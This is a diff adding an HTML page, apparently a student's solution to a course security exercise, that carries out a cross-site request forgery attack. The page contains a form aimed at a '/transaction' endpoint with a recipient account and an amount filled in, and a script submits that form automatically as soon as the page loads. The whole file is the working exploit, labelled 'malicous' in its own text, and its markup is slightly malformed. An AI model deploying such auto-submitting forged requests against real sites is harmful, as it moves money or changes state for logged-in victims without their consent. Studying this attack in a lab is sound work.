@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <h1>
+            Malicous Page
+        </h1>
+        <form id="malicousForm" action="https://final.csci3403.com/transaction" method="POST">
+            <input id="malicousText" name="to" value="dykr5458" required></textarea>
+            <input id="malicousText2" name="amount" value="17" required></textarea>
+            <button type="Submit">Submit</button>
+        </form>
+        <script>
+            console.log("Submitting malicous form");
+            malicousForm = document.getElementById("malicousForm")
+            malicousForm.submit();
+        </script>
+    </head>
+</html>
